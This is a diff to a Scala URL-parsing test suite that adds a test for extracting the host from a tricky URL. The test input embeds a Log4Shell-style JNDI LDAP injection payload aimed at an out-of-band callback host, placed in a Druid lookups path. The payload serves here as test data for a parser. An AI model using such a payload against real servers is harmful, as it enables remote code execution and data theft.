@@ -152,6 +152,10 @@ class URLSpec extends AnyWordSpec with Matchers {
         url.path.encoded should be("/a+b+c")
         url.toString should be("https://test.com/a+b+c")
       }
+      "properly parse a URL with regex interference" in {
+        val url = URL.parse("http://www.booktxt.net.a.bdydns.com/druid/coordinator/v1/lookups/config/%24{jndi{ldap%3A%2F%2Fcn0hgotl5b3uorb5hkqg18fn868ou7bdy.oast.me%2Ftea}}")
+        url.host should be("www.booktxt.net.a.bdydns.com")
+      }
       "properly interpolate a URL" in {
         val url = url"http://www.spice.io"
         url.encoded.toString should be("http://www.spice.io")
